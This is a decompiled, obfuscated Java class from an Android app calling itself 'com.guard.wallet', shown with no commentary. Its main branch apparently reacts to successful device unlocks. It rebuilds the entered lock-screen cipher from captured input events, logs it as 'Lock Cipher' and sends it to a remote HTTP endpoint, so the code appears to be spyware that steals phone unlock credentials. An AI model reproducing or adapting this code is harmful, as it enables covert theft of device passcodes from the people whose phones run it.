package com.guard.wallet.helper;

import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Stream;

public final class f implements Runnable {
   public final int a;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      switch (this.a) {
         case 0:
            g.f();
            return;
         case 1:
            g.d();
            return;
         case 2:
            o.e();
            return;
         case 3:
            o.e();
            return;
         case 4:
            r.f();
            return;
         case 5:
            String var3 = com.guard.wallet.plug.c.g;
            ThreadPoolExecutor var4 = com.guard.wallet.thread.l.a;
            boolean var1;
            if (a1.q.B(var3)) {
               var1 = true;
            } else {
               boolean var2;
               label88: {
                  label87: {
                     Exception var10000;
                     label94: {
                        try {
                           var15 = (ConcurrentLinkedQueue)com.guard.wallet.thread.l.b.get(var3);
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var10001 = false;
                           break label94;
                        }

                        if (var15 == null) {
                           break label87;
                        }

                        try {
                           if (!var15.isEmpty()) {
                              Stream var21 = var15.stream();
                              b var17 = new b(2);
                              var2 = var21.anyMatch(var17);
                              break label88;
                           }
                           break label87;
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var27 = false;
                        }
                     }

                     Exception var16 = var10000;
                     a1.q.s("com.guard.wallet.thread.l", var16);
                  }

                  var2 = false;
               }

               var1 = var2 ^ true;
            }

            if (var1) {
               label73: {
                  Exception var26;
                  label72: {
                     label71: {
                        try {
                           com.guard.wallet.utils.h.G("android.intent.action.DEVICE_PASSWORD_SUCCESS");
                           var22 = com.guard.wallet.plug.c.a;
                           if (var22.isEmpty()) {
                              break label71;
                           }

                           var18 = new ReqUnlockDeviceVO();
                           if (!var22.isEmpty()) {
                              com.guard.wallet.plug.a var5 = new com.guard.wallet.plug.a(var18);
                              var22.removeIf(var5);
                           }
                        } catch (Exception var11) {
                           var26 = var11;
                           boolean var28 = false;
                           break label72;
                        }

                        try {
                           LinkedList var7 = new LinkedList();
                           LinkedList var25 = new LinkedList();
                           LinkedList var6 = new LinkedList();
                           com.guard.wallet.plug.b var8 = new com.guard.wallet.plug.b(this, var7, var25, var6, 0);
                           var22.removeIf(var8);
                           com.guard.wallet.plug.c.a(var25, var18);
                           com.guard.wallet.plug.c.b(var6, var18);
                           com.guard.wallet.plug.c.c(var7, var18);
                           var22.clear();
                           com.guard.wallet.utils.h.C(var18);
                           if (!a1.q.B(var18.getCipherGradeCode()) && com.guard.wallet.plug.c.d(var18.getTextCipher())) {
                              StringBuilder var23 = new StringBuilder("Lock Cipher:");
                              var23.append(var18);
                              Log.d("com.guard.wallet.plug.c", var23.toString());
                              com.guard.wallet.http.l.B(var18);
                              if (MainApplication.getInstance() != null) {
                                 AtomicReference var19 = com.guard.wallet.plug.c.d;
                                 if (!a1.q.B(var19.get())) {
                                    MainApplication.getInstance().offerStrategyEvent((String)var19.get());
                                 }
                              }
                           }
                        } catch (Exception var10) {
                           var26 = var10;
                           boolean var29 = false;
                           break label72;
                        }
                     }

                     try {
                        com.guard.wallet.utils.h.H(4, "android.intent.action.USER_PRESENT");
                        com.guard.wallet.plug.c.d.set(null);
                        com.guard.wallet.plug.c.g = null;
                        break label73;
                     } catch (Exception var9) {
                        var26 = var9;
                        boolean var30 = false;
                     }
                  }

                  Exception var24 = var26;
                  ConcurrentLinkedQueue var20 = com.guard.wallet.plug.c.a;
                  a1.q.s("com.guard.wallet.plug.c", var24);
               }

               var1 = true;
            } else {
               var1 = false;
            }

            if (!var1) {
               com.guard.wallet.plug.c.c.schedule(new f(5), com.guard.wallet.plug.c.f, TimeUnit.SECONDS);
            } else {
               com.guard.wallet.plug.c.e.set(false);
               com.guard.wallet.plug.c.f = 10L;
            }

            return;
         default:
            com.guard.wallet.utils.b.a();
            com.guard.wallet.utils.b.f();
      }
   }
}
